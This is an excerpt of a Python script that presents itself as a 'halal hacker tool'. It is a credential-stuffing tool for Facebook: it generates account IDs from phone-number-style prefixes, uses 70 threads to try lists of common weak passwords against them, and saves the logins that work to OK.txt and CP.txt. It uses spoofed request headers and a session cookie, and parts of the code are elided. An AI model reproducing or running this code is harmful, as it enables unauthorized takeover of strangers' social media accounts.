...
try:
    ...
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
print('\n\033[1;32m[•]   MY Facebook account ');time.sleep(1)
os.system('xdg-open https://www.facebook.com/profile.php?id=100093215959084&mibextid=ZbWKwL')
print('\n\033[1;36m[•]   WELCOME TO RAYEES HALAL HACKER TOOL...');time.sleep(3)
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 017, 016, 018, 019, 013')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'love','bangladesh','fristlast','Emon123','love123','10002000','700800','love12345','50006000']
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'love','bangladesh','fristlast','Emon123','love123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mHalal hacker\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            ...
            # 'cookie': 'datr=2aiJZdN1lkgP_N9wcM9K6I-K; sb=2aiJZchYyvjbzFREUwwptmj_; m_pixel_ratio=1.4028544425964355; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2385%3Btimestamp%3A1703520501; vpd=v1%3B860x437x1.4028544425964355; wd=515x1011; fr=0SdZgw7xUcPwUeTrV.AWXV9TkJy7MahnGvwpXDORjKoVc.BliajZ.pT.AAA.0.0.Bliaka.AWXYJ1h8TMU',
            'dpr': '1.649999976158142',
            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AffJA1et6scDz8mS0MBoHM8vz-uUHtc9fC8ekHUS3f00cEFgJkJjMGj6gQzOjHlQ3fYQSk1BuoK8dv4vtj1NxKvKrMdObBDpIRMc3vJonCBxwg&smuh=19178&lh=Ac_JmfaE40VqkDX7860&wtsid=rdr_0m6fS2VyrVkBLBKlt&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',
